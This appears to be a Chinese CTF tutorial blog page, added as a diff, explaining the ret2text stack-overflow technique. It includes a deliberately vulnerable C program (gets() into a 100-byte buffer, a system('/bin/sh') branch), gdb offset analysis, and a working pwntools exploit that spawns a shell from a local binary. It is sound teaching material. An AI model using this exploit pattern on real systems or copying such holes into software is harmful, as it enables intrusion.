@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2text攻击技术示例</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2text攻击技术示例</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="什么是ret2text">什么是ret2text？</h2>
+
+<p>ret2text是指return to text，意思就是通过向缓冲区填入过多的数据，导致缓冲区溢出，覆盖了返回地址(return address)，返回到程序某处可以被利用的代码后，达成相应的目的，也就是获取了程序中任意地址处代码执行的能力。</p>
+
+<p>ret2text是最简单的栈溢出漏洞利用技术，不需要太多的技术基础就可以进行利用。</p>
+
+<h2 id="ret2text示例代码">ret2text示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//gcc -m32 -fno-stack-protector ret2text.c -o ret2text
+</span><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span> <span class="cm">/* [1] */</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"There is something amazing here, do you know anything?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="cm">/* [2]  */</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Maybe I will tell you next time !"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序也可以从该处下载：<a href="http://od7mpc53s.bkt.clouddn.com/ret2text">ret2text</a></p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>main函数里使用了不安全的gets()函数，因为没有对输入字符长度进行检查，所以会导致缓冲区溢出。我们的思路就是输入过长的数据，使buf溢出，覆盖了gets()函数的返回地址，并在返回地址处修改为system(“/bin/sh”)代码处的地址，这样当main函数返回，程序就会跳转到system(“/bin/sh”)处获取一个shell，从而完成攻击。</p>
+
+<p>我们用gdb挂起程序，逐步调试。</p>
+
+<pre><code class="language-asm">    0x804869b &lt;main+83&gt;:	mov    DWORD PTR [esp],0x804876c
+    0x80486a2 &lt;main+90&gt;:	call   0x8048480 &lt;puts@plt&gt;
+    0x80486a7 &lt;main+95&gt;:	lea    eax,[esp+0x1c]
+=&gt;  0x80486ab &lt;main+99&gt;:	mov    DWORD PTR [esp],eax
+    0x80486ae &lt;main+102&gt;:	call   0x8048460 &lt;gets@plt&gt;
+    0x80486b3 &lt;main+107&gt;:	mov    DWORD PTR [esp],0x80487a4
+    0x80486ba &lt;main+114&gt;:	call   0x8048450 &lt;printf@plt&gt;
+    0x80486bf &lt;main+119&gt;:	mov    eax,0x0
+</code></pre>
+<p>执行到0x80486a7处，使用eax存储了buf的首地址，之后在0x80486ab处将eax的值压入栈中，这里我们查看eax寄存器的值为<em>0xffffcd1c</em>。同时我们观察，此时buf首地址处于栈顶，那我们来查看以下ebp寄存器的值，值为<em>0xffffcd88</em>，而ebp再下面即是返回地址，因此我们可以得出从buf首地址到返回地址之间的距离为</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0xffffcd88</span> <span class="o">-</span> <span class="mh">0xffffcd1c</span> <span class="o">+</span> <span class="mh">0x04</span> <span class="o">=</span> <span class="mh">0x70</span>
+</code></pre></div></div>
+<p>同时我们需要查看 <em>system(“/bin/sh”)</em>的地址</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-d</span> ret2text
+</code></pre></div></div>
+<p>找到system()调用的代码处</p>
+
+<pre><code class="language-asm">804863a:	c7 04 24 63 87 04 08 	movl   $0x8048763,(%esp)
+8048641:	e8 4a fe ff ff       	call   8048490 &lt;system@plt&gt;
+</code></pre>
+<p>我们只要将返回地址覆盖为<em>0x804863a</em>便可获取一个shell</p>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0x804863a</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xffffcd88</span> <span class="o">-</span> <span class="mh">0xffffcd1c</span> <span class="o">+</span> <span class="mh">0x04</span> <span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2text'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/03/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/04/how2heap-01-first-fit/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/03/ret2syscall%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/04/how2heap-01-first-fit/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
